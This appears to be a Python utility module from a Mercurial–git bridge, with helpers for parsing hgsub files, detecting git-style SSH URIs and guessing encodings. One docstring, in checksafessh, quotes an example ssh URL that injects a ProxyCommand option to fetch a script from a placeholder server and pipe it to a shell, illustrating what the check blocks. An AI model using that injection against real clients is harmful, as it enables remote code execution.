"""Compatibility functions for old Mercurial versions and other utility
functions."""

from __future__ import generator_stop

import collections
import contextlib
import re

from dulwich import errors
from mercurial.i18n import _
from mercurial import (
    error,
    extensions,
    phases,
    util as hgutil,
    pycompat,
)

gitschemes = (b'git', b'git+ssh', b'git+http', b'git+https')


@contextlib.contextmanager
def abort_push_on_keyerror():
    """raise a rather verbose error on missing commits"""

    try:
        yield
    except KeyError as e:
        raise error.Abort(
            b'cannot push git commit %s as it is not present locally'
            % e.args[0][:12],
            hint=(
                b'please try pulling first, or as a fallback run git-cleanup '
                b'to re-export the missing commits'
            ),
        )


@contextlib.contextmanager
def forcedraftcommits():
    """Context manager that forces new commits to at least draft,
    regardless of configuration.

    """
    with extensions.wrappedfunction(
        phases,
        'newcommitphase',
        lambda orig, ui: phases.draft,
    ):
        yield


def parse_hgsub(lines):
    """Fills OrderedDict with hgsub file content passed as list of lines"""
    rv = collections.OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls[0] == b'#':
            continue
        name, value = l.split(b'=', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsub(data):
    """Produces a string from OrderedDict hgsub content"""
    return b''.join(b'%s = %s\n' % (n, v) for n, v in data.items())


def parse_hgsubstate(lines):
    """Fills OrderedDict with hgsubtate file content passed as list of lines"""
    rv = collections.OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls[0] == b'#':
            continue
        value, name = l.split(b' ', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsubstate(data):
    """Produces a string from OrderedDict hgsubstate content"""
    return b''.join(b'%s %s\n' % (data[n], n) for n in sorted(data))


def transform_notgit(f):
    '''use as a decorator around functions that call into dulwich'''

    def inner(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except errors.NotGitRepository:
            raise error.Abort(b'not a git repository')

    return inner


def isgitsshuri(uri):
    """Method that returns True if a uri looks like git-style uri

    Tests:

    >>> print(isgitsshuri(b'http://fqdn.com/hg'))
    False
    >>> print(isgitsshuri(b'http://fqdn.com/test.git'))
    False
    >>> print(isgitsshuri(b'git@github.com:user/repo.git'))
    True
    >>> print(isgitsshuri(b'github-123.com:user/repo.git'))
    True
    >>> print(isgitsshuri(b'git@127.0.0.1:repo.git'))
    True
    >>> print(isgitsshuri(b'git@[2001:db8::1]:repository.git'))
    True
    """
    for scheme in gitschemes:
        if uri.startswith(b'%s://' % scheme):
            return False

    if uri.startswith(b'http:') or uri.startswith(b'https:'):
        return False

    m = re.match(br'(?:.+@)*([\[]?[\w\d\.\:\-]+[\]]?):(.*)', uri)
    if m:
        # here we're being fairly conservative about what we consider to be git
        # urls
        giturl, repopath = m.groups()
        # definitely a git repo
        if len(giturl) > 1 and repopath.endswith(b'.git'):
            return True
        # use a simple regex to check if it is a fqdn regex
        fqdn_re = (
            br'(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}'
            br'(?<!-)\.)+[a-zA-Z]{2,63}$)'
        )
        if re.match(fqdn_re, giturl):
            return True
    return False


def checksafessh(host):
    """check if a hostname is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    host = hgutil.urlreq.unquote(host)
    if host.startswith(b'-'):
        raise error.Abort(_(b"potentially unsafe hostname: '%s'") % (host,))


def decode_guess(string, encoding):
    # text is not valid utf-8, try to make sense of it
    if encoding:
        try:
            return string.decode(pycompat.sysstr(encoding)).encode('utf-8')
        except UnicodeDecodeError:
            pass

    try:
        return string.decode('latin-1').encode('utf-8')
    except UnicodeDecodeError:
        return string.decode('ascii', 'replace').encode('utf-8')


# Stolen from hgsubversion
def swap_out_encoding(new_encoding=b'UTF-8'):
    try:
        from mercurial import encoding

        old = encoding.encoding
        encoding.encoding = new_encoding
    except (AttributeError, ImportError):
        old = hgutil._encoding
        hgutil._encoding = new_encoding
    return old
